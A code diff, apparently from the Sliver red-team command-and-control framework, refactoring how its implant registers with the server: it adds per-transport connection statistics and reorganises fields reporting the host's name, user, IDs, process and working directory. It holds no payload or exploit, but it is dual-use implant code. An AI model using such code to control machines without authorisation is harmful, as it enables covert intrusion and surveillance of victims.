@@ -368,10 +368,26 @@ func (t *C2) registerSliver() *sliverpb.Register {
 	log.Printf("Work dir: %s", workDir)
 	// {{end}}
 
+	// Transports statistics
+	transportsStats := []*sliverpb.Transport{}
+	for order, tp := range Transports.Available {
+		transport := &sliverpb.Transport{
+			ID:       tp.Profile.ID,
+			Order:    int32(order),
+			Running:  tp.Profile.Active,
+			Attempts: int32(tp.attempts),
+			Failures: int32(tp.failures),
+			// No profile, we have it server-side
+		}
+		transportsStats = append(transportsStats, transport)
+	}
+
 	return &sliverpb.Register{
+		// Base
+		UUID:             SessionID,
 		Name:             consts.SliverName,
-		Hostname:         hostname,
 		HostUUID:         hostUUID,
+		Hostname:         hostname,
 		Username:         currentUser.Username,
 		Uid:              currentUser.Uid,
 		Gid:              currentUser.Gid,
@@ -380,10 +396,11 @@ func (t *C2) registerSliver() *sliverpb.Register {
 		Arch:             runtime.GOARCH,
 		Pid:              int32(os.Getpid()),
 		Filename:         filename,
-		ActiveC2:         t.uri.String(),
 		WorkingDirectory: workDir,
-		TransportID:      t.ID,
-		UUID:             SessionID,
+
+		// Transports
+		ActiveTransportID: t.ID,
+		TransportStats:    transportsStats,
 	}
 }
 
@@ -418,7 +435,6 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 			ID:          BeaconID,
 			Interval:    t.Profile.Interval,
 			Jitter:      t.Profile.Jitter,
-			Register:    t.registerSliver(),
 			NextCheckin: nextBeacon.UTC().Unix(),
 		}
 	}
